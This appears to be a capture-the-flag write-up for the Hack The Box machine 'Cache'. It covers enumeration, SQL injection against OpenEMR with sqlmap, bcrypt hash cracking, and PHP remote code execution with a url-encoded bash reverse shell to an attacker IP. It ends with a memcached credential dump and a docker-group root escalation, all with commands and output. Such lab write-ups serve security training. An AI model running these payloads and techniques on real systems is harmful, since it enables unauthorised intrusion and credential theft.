## Default Information
IP address : 10.10.10.188\
OS : Linux

## Discovery
Before we being, let's add the IP address and host to our ```/etc/hosts``` file. 
```
10.10.10.188    cache.htb 
```
### Nmap
Firstly, let us enumerate all the open ports using Nmap
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```
nmap -sC -sV -A -p- -T4 10.10.10.188 -vv
```

From the output of Nmap, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.29 (Ubuntu) | Open |

Next, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.10.188 -T4 -vv 
```

### Gobuster
Let's try to discover for the endpoints on ```http://cache.htb```. From the results, we discover that there is a ```jquery``` directory that are of interest to us.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.188
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/22 00:16:18 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.188/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.188/javascript/]
http://10.10.10.188/jquery               (Status: 301) [Size: 313] [--> http://10.10.10.188/jquery/]
http://10.10.10.188/server-status        (Status: 403) [Size: 277] 
```
### Obtaining credentials 
Visiting the ```/jquery``` endpoint, we are able to find a ```functionality.js``` file. Viewing the javascript file, we realize that this is a code determining the logic 
for login functionality. In the code, we find that the username is ```ash``` and the password is ```H@v3_fun```

![functionality.js file](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/functionality_js.PNG)

However, after logging in we are unable to find any possible points of entry for exploitation. All we can see is a page showing that the webpage is still under construction.

![Page under construction](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/construction_page.PNG)

Viewing the ```author.html``` endpoint, we discover that the author is also involved in another project --> HMS (Hospital Management Project). So, we will try to add the following sites to our ```/etc/hosts``` file.

```
10.10.10.188    cache.htb hms.htb hms.cache.htb cache.hms.htb
```

### Finding endpoints on hms.htb

First, we will do a scan using ```Nikto``` to uncover potential vulnerabilities. The scan picked up a publicly-accessible ```admin.php``` page that reveals sensitive information such as the database name, and the version of OpenEMR used. Searching up CVEs for OpenEMR, there is a potential exploit for authentication bypass. However, it only allows us to bypass the patient login which may not be very useful in our case. We take note of this in case we are unable to find an exploit later. 

![admin.php page](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/admin_php.PNG)

Next, we will do a directory enumeration on ```cache.htb``` using ```gobuster```. However, these endpoints do not provide much useful information that can be used to gain access into the system (OR RATHER THERE IS TOO MUCH INFORMATION AND I JUST SKIMMED THRU)

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://hms.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hms.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/22 11:35:02 Starting gobuster in directory enumeration mode
===============================================================
http://hms.htb/services             (Status: 301) [Size: 305] [--> http://hms.htb/services/]
http://hms.htb/templates            (Status: 301) [Size: 306] [--> http://hms.htb/templates/]
http://hms.htb/modules              (Status: 301) [Size: 304] [--> http://hms.htb/modules/]  
http://hms.htb/common               (Status: 301) [Size: 303] [--> http://hms.htb/common/]   
http://hms.htb/library              (Status: 301) [Size: 304] [--> http://hms.htb/library/]  
http://hms.htb/public               (Status: 301) [Size: 303] [--> http://hms.htb/public/]   
http://hms.htb/images               (Status: 301) [Size: 303] [--> http://hms.htb/images/]   
http://hms.htb/portal               (Status: 301) [Size: 303] [--> http://hms.htb/portal/]   
http://hms.htb/tests                (Status: 301) [Size: 302] [--> http://hms.htb/tests/]    
http://hms.htb/sites                (Status: 301) [Size: 302] [--> http://hms.htb/sites/]    
http://hms.htb/custom               (Status: 301) [Size: 303] [--> http://hms.htb/custom/]   
http://hms.htb/javascript           (Status: 301) [Size: 307] [--> http://hms.htb/javascript/]
http://hms.htb/contrib              (Status: 301) [Size: 304] [--> http://hms.htb/contrib/]   
http://hms.htb/interface            (Status: 301) [Size: 306] [--> http://hms.htb/interface/] 
http://hms.htb/vendor               (Status: 301) [Size: 303] [--> http://hms.htb/vendor/]    
http://hms.htb/config               (Status: 301) [Size: 303] [--> http://hms.htb/config/]    
http://hms.htb/Documentation        (Status: 301) [Size: 310] [--> http://hms.htb/Documentation/]
http://hms.htb/sql                  (Status: 301) [Size: 300] [--> http://hms.htb/sql/]          
http://hms.htb/LICENSE              (Status: 200) [Size: 35147]                                  
http://hms.htb/ci                   (Status: 301) [Size: 299] [--> http://hms.htb/ci/]           
http://hms.htb/cloud                (Status: 301) [Size: 302] [--> http://hms.htb/cloud/]        
http://hms.htb/ccr                  (Status: 301) [Size: 300] [--> http://hms.htb/ccr/]          
http://hms.htb/patients             (Status: 301) [Size: 305] [--> http://hms.htb/patients/]     
http://hms.htb/repositories         (Status: 301) [Size: 309] [--> http://hms.htb/repositories/] 
http://hms.htb/myportal             (Status: 301) [Size: 305] [--> http://hms.htb/myportal/]     
http://hms.htb/entities             (Status: 301) [Size: 305] [--> http://hms.htb/entities/]     
http://hms.htb/controllers          (Status: 301) [Size: 308] [--> http://hms.htb/controllers/]  
http://hms.htb/server-status        (Status: 403) [Size: 272]                                    
                                                                                                 
===============================================================
2021/08/22 11:55:12 Finished
===============================================================
```

## Exploit
### CVE-2018-15152
Looks like we have to try CVE-2018-15152 to bypass the authentication of ```/portal/account/register.php```. First, we will go to ```/portal/account/register.php``` and afterwards we will navigate to ```/portal/add_edit_events_user.php```. However, we realize that ```/portal/add_edit_events_user.php``` is vulnerable to SQL injection from the POC shown below. 

![SQL Injection vulnerability POC](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/sql_injection.PNG)

We will now try to dump out the admin credentials using ```sqlmap```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap --cookie="PHPSESSID=mnf7afl4jmtovagi5p9p6jek63; OpenEMR=0k56dt9dj1qvcaopa9s2o804e7" --url=http://hms.htb/portal/add_edit_event_user.php?eid=1 --tables -D openemr -T users_secure --dump             2 ⚙
        ___
       __H__                                                                                                                                                                                                        
 ___ ___[']_____ ___ ___  {1.5.5#stable}                                                                                                                                                                            
|_ -| . ["]     | .'| . |                                                                                                                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                           
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:18:37 /2021-08-22/

[13:18:37] [INFO] resuming back-end DBMS 'mysql' 
[13:18:37] [INFO] testing connection to the target URL
[13:18:38] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (4734=4734) THEN 1 ELSE (SELECT 3571 UNION SELECT 7255) END))

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x7171766a71,(SELECT (ELT(1610=1610,1))),0x717a707871),1610)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 5144 FROM (SELECT(SLEEP(5)))RrNB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171766a71,0x53474d4e7a6d6e57566c437a42576c726c62704a7267487849435667436d684d4d4d525941546858,0x717a707871),NULL-- -
---
[13:18:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.6
[13:18:38] [INFO] fetching tables for database: 'openemr'
Database: openemr
[13:18:38] [INFO] fetching columns for table 'users_secure' in database 'openemr'
[13:18:38] [INFO] fetching entries for table 'users_secure' in database 'openemr'
Database: openemr
Table: users_secure
[1 entry]
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| id | salt    | password                                                     | username | last_update         | salt_history1 | salt_history2 | password_history1              | password_history2 |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| 1  | <blank> | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | <blank>  | 2019-11-21 06:38:40 | <blank>       | <blank>       | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin     |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
```
### Cracking hash
From the output, we are able to obtain the username as ```openemr_admin``` and the password hash as ```$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.```. Using John the Ripper, we manage to crack the hash as xxxxxx.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=rockyou.txt password.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2021-08-23 21:11) 7.692g/s 6646p/s 6646c/s 6646C/s tristan..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### CVE-2018-15142
Using CVE-2018-15142, we realize that we can execute arbitary PHP code from the vulnerable ```/portal/import_template``` endpoint. We will first create a POC for this vulnerable endpoint. Visitng ```/portal/payload.php```, we notice that we can see the PHP page, which shows that the exploit has succeeded.

![POC for RCE](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_poc.PNG)

Now, what we have to do is to craft a single line url-encoded PHP payload, ```%3C%3Fphp%0A%0Aexec(%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.250%2F3001%200%3E%261%27%22)%3B``` that uploads a reverse shell to the vulnerable website. We will then trigger the payload by visiting ```/portal/exploit.php```

![RCE reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_reverse_shell.PNG)

### Obtaining reverse shell
Now, we just have to stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.188] 52156
bash: cannot set terminal process group (1603): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/portal$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<al$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@cache:/var/www/hms.htb/public_html/portal$ export TERM=xterm
export TERM=xterm
www-data@cache:/var/www/hms.htb/public_html/portal$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@cache:/var/www/hms.htb/public_html/portal$ 
```

### Obtaining user flag
However, we realize that we do not have the appropriate permissions to obtain the user flag.

```
www-data@cache:/$ cd /home/ash
cd /home/ash
www-data@cache:/home/ash$ ls
ls
Desktop  Documents  Downloads  Music  Pictures  Public  user.txt
www-data@cache:/home/ash$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@cache:/home/ash$ 
```

Recalling that we have obtained the credentials for the user ```ash``` previously, we will switch the user to ```ash``` using the credentials. Afterwards, we will be able to obtain the user flag
```
www-data@cache:/home/ash$ su ash
su ash
Password: H@v3_fun

ash@cache:~$ cat user.txt
cat user.txt
<Redacted user flag>
ash@cache:~$
```

## Privilege Escalation to luffy

First, we will try to check if the user ```ash``` has the sudo permissions on this terminal. However, it seems that the ```ash``` does not have permissions to execution sudo privileges.

```
ash@cache:~$ sudo -l
sudo -l
[sudo] password for ash: H@v3_fun

Sorry, user ash may not run sudo on cache.
```

Next, we will scan the terminal with ```linpeas.sh``` script to find for potential entry points to escalate into root. From the output, we can observe that the ```apache2``` process stores credentials in memory, and at the same time, we are also able to find several 2 open ports listening on the local host. This is a sign that we could potentially connect to the IP address and find credentials cache in memory (MAYBE?)

```
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory    
gdm-password Not Found                                                                           
gnome-keyring-daemon Not Found                                                                   
lightdm Not Found                                                                                
vsftpd Not Found                                                                                 
apache2 process found (dump creds from memory as root)                                           
sshd Not Found
```

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                         
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We are also able to discover another new user ```luffy```, but what is interesting about this user is that there this user is part of the ```docker``` group, which is a hint that there may be docker service running on that terminal. We will investigate this in detail later one. 

```
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

Knowing that this is a memcached server, we will try to dump all the keys in the server. From there, we are able to obtain the password of the user ```luffy```

```
ash@cache:~$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats cachedump 1 0
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
get user
get user
VALUE user 0 5
luffy
END
get passwd
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
quit
quit
Connection closed by foreign host.
```

With the credentials, we will now su into ```luffy```. However, this user is still unable to execute ```sudo``` commands. 

```
ash@cache:~$ su luffy
su luffy
Password: 0n3_p1ec3
luffy@cache:/home/ash$ cd
cd
luffy@cache:~$ ls
ls
luffy@cache:~$ sudo -l
sudo -l
[sudo] password for luffy: 0n3_p1ec3

Sorry, user luffy may not run sudo on cache.
luffy@cache:~$ 
```

### Docker container escapa
However, we recall from previous enumeration that ```luffy``` is part of the ```docker``` group. Hence, we will staty by checking the docker images and containers that are running on this terminal. We realized that even though there is no docker container running at the moment, we are able to execute a dockerised ubuntu iamge.

```
luffy@cache:~$ docker ps
docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
luffy@cache:~$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        23 months ago       64.2MB
```

Lastly, we will spawn a root shell using the docker image to break out of the restricted environment.

```
luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh                    
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# python3 -c 'import pty; pty.spawn("/bin/bash")'    
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@3bfb2314758:/# export TERM=xterm
export TERM=xterm
root@3bfb231b4758:/# stty cols 132 rows 34
stty cols 132 rows 34
root@3bfb231b4758:/# cd /root

cd /root
root@3bfb231b4758:~# 
```

### Obtaining the root flag

Lastly, we just have to obtain the root flag

```
root@3bfb231b4758:~# cat root.txt
cat root.txt
<Redacted root flag>
root@3bfb231b4758:~# 
```
